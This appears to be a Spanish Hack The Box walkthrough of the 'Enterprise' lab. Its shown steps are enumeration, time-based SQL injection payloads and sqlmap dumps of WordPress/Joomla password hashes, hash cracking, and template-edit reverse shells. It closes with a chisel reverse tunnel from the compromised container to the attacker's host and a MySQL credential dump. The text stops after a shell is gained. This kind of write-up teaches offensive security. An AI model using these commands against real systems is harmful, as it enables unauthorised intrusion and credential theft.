---
layout: post
title: Enterprise
date: 2023-03-08
description:
img:
fig-caption:
tags: [eWPT, eCPPTv2, eCPTXv2]
---
___

<center><img src="/writeups/assets/img/Enterprise-htb/Enterprise.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración web

* SQLi

* Abudo de Plugins WordPress

* Explotación de Joomla

* Docker Breakout

* Análisis de binario con Ghidra

* Buffer Overflow - Bypass PIE [Ret2libc] (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.61 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 09:28 GMT
Nmap scan report for 10.10.10.61
Host is up (0.071s latency).
Not shown: 64862 closed tcp ports (reset), 668 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
8080/tcp  open  http-proxy
32812/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.79 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,443,8080,32812 10.10.10.61 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 09:29 GMT
Nmap scan report for 10.10.10.61
Host is up (0.071s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4e98cc5b55223f4b8ced1964ac0faac (RSA)
|   256 f39a8558aad981382dea1518f78edd42 (ECDSA)
|_  256 debf116dc027e3fc1b34c04f4f6c768b (ED25519)
80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
|_http-title: USS Enterprise &#8211; Ships Log
|_http-generator: WordPress 4.8.1
|_http-server-header: Apache/2.4.10 (Debian)
443/tcp   open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
| Not valid before: 2017-08-25T10:35:14
|_Not valid after:  2017-09-24T10:35:14
8080/tcp  open  http     Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
32812/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions: 
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|     Enter Bridge Access Code: 
|     Invalid Code
|     Terminating Console
|   NULL: 
|     _______ _______ ______ _______
|     |_____| |_____/ |______
|     |_____ |_____ | | | _ ______|
|     Welcome to the Library Computer Access and Retrieval System
|_    Enter Bridge Access Code:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port32812-TCP:V=7.93%I=7%D=3/8%Time=64085582%P=x86_64-pc-linux-gnu%r(NU
SF:LL,ED,"\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x2
SF:0\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x20\x
SF:20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Compute
SF:r\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Access\
SF:x20Code:\x20\n")%r(GenericLines,110,"\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______\x2
SF:0_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x2
SF:0\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______\n\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x20
SF:\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x20t
SF:o\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20System
SF:\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTerminat
SF:ing\x20Console\n\n")%r(GetRequest,110,"\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______\
SF:x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\
SF:x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x
SF:20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x2
SF:0to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Syst
SF:em\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermin
SF:ating\x20Console\n\n")%r(HTTPOptions,110,"\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20____
SF:__\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x
SF:20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|____
SF:__\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\
SF:|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome
SF:\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20S
SF:ystem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTer
SF:minating\x20Console\n\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.02 seconds
```

## Puerto 80, 8080 (HTTP) | Puerto 443 (HTTPS)

Con ```whatweb```, analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.61
http://10.10.10.61 [200 OK] Apache[2.4.10], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[10.10.10.61], JQuery[1.12.4], MetaGenerator[WordPress 4.8.1], PHP[5.6.31], PoweredBy[WordPress], Script[text/javascript], Title[USS Enterprise &#8211; Ships Log], UncommonHeaders[link], WordPress[4.8.1], X-Powered-By[PHP/5.6.31]
```

```null
whatweb http://10.10.10.61:8080
http://10.10.10.61:8080 [200 OK] Apache[2.4.10], Bootstrap, Cookies[14cd8f365a67fad648754407628a1809], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], HttpOnly[14cd8f365a67fad648754407628a1809], IP[10.10.10.61], JQuery, MetaGenerator[Joomla! - Open Source Content Management], PHP[7.0.23], PasswordField[password], Script[application/json], Title[Home], X-Powered-By[PHP/7.0.23]
```

```null
whatweb https://10.10.10.61
https://10.10.10.61 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.25 (Ubuntu)], IP[10.10.10.61], Title[Apache2 Ubuntu Default Page: It works]
```

Agrego el dominio ```enterprise.htb``` al ```/etc/hosts```

La página principal se ve así:

<img src="/writeups/assets/img/Enterprise-htb/1.png" alt="">

Aplico fuzzing para descubrir los plugins del ```WordPress```

```null
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt 'http://10.10.10.61/FUZZ'
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.61/FUZZ
Total requests: 13368

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000468:   403        11 L     32 W       313 Ch      "wp-content/plugins/akismet/"                                                                                                                  
000004593:   200        2 L      15 W       145 Ch      "wp-content/plugins/hello.php/"                                                                                                                
000004592:   200        2 L      15 W       145 Ch      "wp-content/plugins/hello.php"                                                                                                                 

Total time: 20.18960
Processed Requests: 13368
Filtered Requests: 13365
Requests/sec.: 662.1227
```

El ```hello.php``` devuelve un error en la respuesta

```null
curl -s -X GET http://10.10.10.61/wp-content/plugins/hello.php
<br />
<b>Fatal error</b>:  Call to undefined function add_action() in <b>/var/www/html/wp-content/plugins/hello.php</b> on line <b>60</b><br />
```

```null
El ```robots.txt``` del puerto 8080 existe y está expuesto

```null
curl -s -X GET http://10.10.10.61:8080/robots.txt
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
```

En la cabecera de los posts, se puedde ver un usuario del CMS

<img src="/writeups/assets/img/Enterprise-htb/2.png" alt="">

Aplico fuzzing para descubirr rutas en el puerto 443

```null
gobuster dir -u https://10.10.10.61/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.61/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/08 09:59:12 Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 312] [--> https://10.10.10.61/files/]
```

Dentro de ```/files``` hay un comprimido

```null
curl -s -X GET https://10.10.10.61/files/ -k | html2text
****** Index of /files ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[   ]]       lcars.zip        2017-10-17 21:46 1.4K  
===========================================================================
     Apache/2.4.25 (Ubuntu) Server at 10.10.10.61 Port 443
```

Lo descargo para ver su contenido

```null
curl -s -X GET https://10.10.10.61/files/lcars.zip -k -o lcars.zip
```

```null
7z l lcars.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,128 CPUs Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz (A0652),ASM,AES-NI)

Scanning the drive for archives:
1 file, 1406 bytes (2 KiB)

Listing archive: lcars.zip

--
Path = lcars.zip
Type = zip
Physical Size = 1406

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2017-10-17 01:25:27 .....          501          319  lcars/lcars_db.php
2017-10-17 01:32:10 .....          624          364  lcars/lcars_dbpost.php
2017-10-17 04:53:59 .....          377          207  lcars/lcars.php
------------------- ----- ------------ ------------  ------------------------
2017-10-17 04:53:59               1502          890  3 files
```

En el certificado se puede ver otro usuario

```null
openssl s_client -connect 10.10.10.61:443 | grep CN | sort -u
Can't use SSL_get_servername
depth=0 C = UK, ST = United Federation of Planets, L = Earth, O = USS Enterprise, OU = Bridge, CN = enterprise.local, emailAddress = jeanlucpicard@enterprise.local
verify error:num=18:self-signed certificate
verify return:1
```

```lcars.php``` es un plugin válido

```null
/*
*     Plugin Name: lcars
*     Plugin URI: enterprise.htb
*     Description: Library Computer Access And Retrieval System
*     Author: Geordi La Forge
*     Version: 0.2
*     Author URI: enterprise.htb
*                             */
```

Parece que este ```zip``` es un backup de lo que hay en producción

```null
curl -s -X GET http://10.10.10.61/wp-content/plugins/lcars/ | html2text
****** Forbidden ******
You don't have permission to access /wp-content/plugins/lcars/ on this server.
===============================================================================
     Apache/2.4.10 (Debian) Server at 10.10.10.61 Port 80
```

El archivo ```lcars_db.php``` es vulnerable a inyección SQL, ya que el ```query``` no se está forzando a entero

```null
// test to retireve an ID
if (isset($_GET['query'])){
    $query = $_GET['query'];
    $sql = "SELECT ID FROM wp_posts WHERE post_name = $query";
    $result = $db->query($sql);
    echo $result;
} else {
    echo "Failed to read query";
}
```

Al intentar enumerar las columnas, no veo ningún error. Pero puedo basarme en el tiempo

```null
http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1%20and%20sleep(5)--%20-
```

La idea es jugar con condicionales y medir el tiempo de respuesta

```null
http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1%20and%20if%20substr(database(),1,1)=%27a%27,sleep(5),1)--%20-
``` 

Como va a haber que enumerar mucho contenido, utilizo ```sqlmap``` para agilizar, aunque se podría con un script en python

```null
sqlmap --url 'http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1*' --dbs --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org
---
[11:33:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10, PHP 5.6.31
back-end DBMS: MySQL >= 5.0
[11:33:22] [INFO] fetching database names
[11:33:22] [INFO] retrieved: 'information_schema'
[11:33:23] [INFO] retrieved: 'joomla'
[11:33:23] [INFO] retrieved: 'joomladb'
[11:33:24] [INFO] retrieved: 'mysql'
[11:33:24] [INFO] retrieved: 'performance_schema'
[11:33:24] [INFO] retrieved: 'sys'
[11:33:25] [INFO] retrieved: 'wordpress'
[11:33:25] [INFO] retrieved: 'wordpressdb'
available databases [8]:
[*] information_schema
[*] joomla
[*] joomladb
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
[*] wordpressdb
```

Para la base de datos ```joomladb```, listo las tablas

```null
sqlmap --url 'http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1*' -D joomladb --tables --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
Database: joomladb
[72 tables]
+-------------------------------+
...
| edz2g_users                   |
...

Me quedo con los usuarios

```null
sqlmap --url 'http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1*' -D joomladb -T edz2g_users --columns --batch
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
Database: joomladb
Table: edz2g_users
[16 columns]
+---------------+---------------+
| Column        | Type          |
+---------------+---------------+
| activation    | varchar(100)  |
| block         | tinyint(4)    |
| email         | varchar(100)  |
| id            | int(11)       |
| lastResetTime | datetime      |
| lastvisitDate | datetime      |
| name          | varchar(400)  |
| otep          | varchar(1000) |
| otpKey        | varchar(1000) |
| params        | text          |
| password      | varchar(100)  |
| registerDate  | datetime      |
| requireReset  | tinyint(4)    |
| resetCount    | int(11)       |
| sendEmail     | tinyint(4)    |
| username      | varchar(150)  |
+---------------+---------------+
```

Selecciono usuarios y contraseñas

```null
sqlmap --url 'http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1*' -D joomladb -T edz2g_users -C username,password --dump --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
Database: joomladb
Table: edz2g_users
[2 entries]
+-----------------+--------------------------------------------------------------+
| username        | password                                                     |
+-----------------+--------------------------------------------------------------+
| Guinan          | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q |
| geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy |
+-----------------+--------------------------------------------------------------+
```

Pero la contraseña no está en ningún diccionario. Listo las tablas para la base de datos ```wordpress```

```null
sqlmap --url 'http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1*' -D wordpress --tables --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
Database: wordpress
[12 tables]
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
```

Y de nuevo los usuarios

```null
sqlmap --url 'http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1*' -D wordpress -T wp_users --columns --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
Database: wordpress
Table: wp_users
[10 columns]
+---------------------+---------------------+
| Column              | Type                |
+---------------------+---------------------+
| display_name        | varchar(250)        |
| ID                  | bigint(20) unsigned |
| user_activation_key | varchar(255)        |
| user_email          | varchar(100)        |
| user_login          | varchar(60)         |
| user_nicename       | varchar(50)         |
| user_pass           | varchar(255)        |
| user_registered     | datetime            |
| user_status         | int(11)             |
| user_url            | varchar(100)        |
+---------------------+---------------------+
```

```null
sqlmap --url 'http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1*' -D wordpress -T wp_users -C user_login,user_pass --dump --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:13:13 /2023-03-08/

```null
Database: wordpress
Table: wp_users
[1 entry]
+---------------+------------------------------------+
| user_login    | user_pass                          |
+---------------+------------------------------------+
| william.riker | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. |
+---------------+------------------------------------+
```

Tampoco se puede crackear. Me dumpeo los posts existentes

```null
sqlmap --url 'http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1*' -D wordpress -T wp_posts --columns --batch
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
Database: wordpress
Table: wp_posts
[23 columns]
+-----------------------+---------------------+
| Column                | Type                |
+-----------------------+---------------------+
| comment_count         | bigint(20)          |
| comment_status        | varchar(20)         |
| guid                  | varchar(255)        |
| ID                    | bigint(20) unsigned |
| menu_order            | int(11)             |
| ping_status           | varchar(20)         |
| pinged                | text                |
| post_author           | bigint(20) unsigned |
| post_content          | longtext            |
| post_content_filtered | longtext            |
| post_date             | datetime            |
| post_date_gmt         | datetime            |
| post_excerpt          | text                |
| post_mime_type        | varchar(100)        |
| post_modified         | datetime            |
| post_modified_gmt     | datetime            |
| post_name             | varchar(200)        |
| post_parent           | bigint(20) unsigned |
| post_password         | varchar(255)        |
| post_status           | varchar(20)         |
| post_title            | text                |
| post_type             | varchar(20)         |
| to_ping               | text                |
+-----------------------+---------------------+
```

```null
sqlmap --url 'http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1*' -D wordpress -T wp_posts -C post_content --dump --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
...
[12:22:15] [INFO] table 'wordpress.wp_posts' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.10.61/dump/wordpress/wp_posts.csv'
[12:22:15] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.10.61'
```

Lo muevo a mi directoiro de trabajo para adaptarlo y que sea legible

```null
mv /root/.local/share/sqlmap/output/10.10.10.61/dump/wordpress/wp_posts.csv .
```

```null
cat wp_posts.csv | sed 's/\\n/\n/g' | sed 's/\\r/\r/g' | sed '/^\s*$/d' | sponge wp_posts.csv
```

Un post oculto contiene contraseñas

```null
I wonder what lays ahead of us. Time will tell.
Its been a long time coming but finally the Enterprise is departing the San Francisco Fleet Yards on her maiden flight.
Sadly Lieutenant Commander Work is no longer a member of the crew as has transferred to DS9.
I wonder what lays ahead of us. Time will tell.
Needed somewhere to put some passwords quickly
ZxJyhGem4k338S2Y
enterprisencc170
u*Z14ru0p#ttj83zS6
Needed somewhere to put some passwords quickly
ZxJyhGem4k338S2Y
enterprisencc170
ZD3YxfnSjezg67JZ
u*Z14ru0p#ttj83zS6
Needed somewhere to put some passwords quickly
ZxJyhGem4k338S2Y
enterprisencc170
ZD3YxfnSjezg67JZ
u*Z14ru0p#ttj83zS6
```

Las reutilizo para crackear los hashes que ya tengo

```null
john -w:/home/rubbx/Desktop/HTB/Machines/Enterprise/lcars/dictionary hashes
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 4 candidates left, minimum 12 needed for performance.
ZD3YxfnSjezg67JZ (geordi.la.forge)     
ZxJyhGem4k338S2Y (Guinan)     
2g 0:00:00:00 DONE (2023-03-08 12:29) 10.00g/s 20.00p/s 40.00c/s 40.00C/s ZxJyhGem4k338S2Y..u*Z14ru0p#ttj83zS6
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Puedo iniciar sesión en el ```Joomla``` en ```/administrator```

<img src="/writeups/assets/img/Enterprise-htb/3.png" alt="">

La otra credencial es válida para el ```Wordpress``` en ```/wp-admin```

```null
john -w:/home/rubbx/Desktop/HTB/Machines/Enterprise/lcars/dictionary hash
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 4 candidates left, minimum 96 needed for performance.
u*Z14ru0p#ttj83zS6 (william.riker)     
1g 0:00:00:00 DONE (2023-03-08 12:35) 100.0g/s 400.0p/s 400.0c/s 400.0C/s ZxJyhGem4k338S2Y..u*Z14ru0p#ttj83zS6
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 
```

<img src="/writeups/assets/img/Enterprise-htb/4.png" alt="">

Actualizo la plantilla ```404.php``` para ganar acceso al sistema

<img src="/writeups/assets/img/Enterprise-htb/5.png" alt="">

Gano acceso a un contenedor en una sesión de netcat

```null
curl 'http://10.10.10.61/?p=123123'
```

```null
www-data@b8319d86d21e:/var/www/html$ whoami
www-data
www-data@b8319d86d21e:/var/www/html$ hostname -I
172.17.0.3 
```

Con un binario estático de ```nmap```, aplico HostDiscovery

```null
www-data@b8319d86d21e:/tmp$ ./nmap --open -n -Pn --min-rate 5000 172.17.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-08 12:48 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.00039s latency).
Not shown: 1200 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
5355/tcp open  hostmon
8080/tcp open  http-alt

Nmap scan report for 172.17.0.2
Host is up (0.00037s latency).
Not shown: 1204 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap scan report for 172.17.0.3
Host is up (0.00011s latency).
Not shown: 1204 closed ports
PORT   STATE SERVICE
80/tcp open  http
```

Una IP tiene abierto el ```MySQL```. En el archivo de configuración ```wp-config.php```, están las credenciales almacenadas en texto claro

```null
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'NCC-1701E');
```

Como la máquina no tiene ```MySQL``` instalado, subo el ```chisel``` para conectarme desde mi equipo

En mi equipo, ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

Desde el contenedor me conecto como cliente

```null
www-data@b8319d86d21e:/tmp$ ./chisel client 10.10.16.9:1234 R:socks &>/dev/null & disown
```

Me conecto pasando por ```proxychains```

```null
proxychains mysql -h 172.17.0.2 -uroot -p
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 2529
Server version: 5.7.19 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

De la base de datos ```mysql``` puedo listar usuarios y hashes

```null
MySQL [mysql]> select Host,User,authentication_string from user;
+-----------+-------------+-------------------------------------------+
| Host      | User        | authentication_string                     |
+-----------+-------------+-------------------------------------------+
| localhost | root        | *95B8A7B0A041CF2011BEA41DB57315C603285253 |
| %         | root        | *95B8A7B0A041CF2011BEA41DB57315C603285253 |
| localhost | mysql.sys   | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
| localhost | joomladb    | *2EB70FD4EB74F31283541AAD4E83AB6E077BC0DF |
| localhost | wordpressdb | *10C910BC9C2C46140DC275CB69DC6565DE125630 |
+-----------+-------------+-------------------------------------------+
5 rows in set (0.138 sec)
```

Pero uno de ellos parece que está en texto claro. De momento lo dejo de lado y gano acceso al contenedor del ```Joomla```

<img src="/writeups/assets/img/Enterprise-htb/6.png" alt="">

```null
curl 'http://10.10.10.61:8080/error.php'
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.61] 37982
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@a7018bfdc454:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
www-data@a7018bfdc454:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@a7018bfdc454:/var/www/html$ export TERM=xterm
www-data@a7018bfdc454:/var/www/html$ export SHELL=bash
www-data@a7018bfdc454:/var/www/html$ stty rows 55 columns 209
```

```null
www-data@a7018bfdc454:/var/www/html$ whoami
www-data
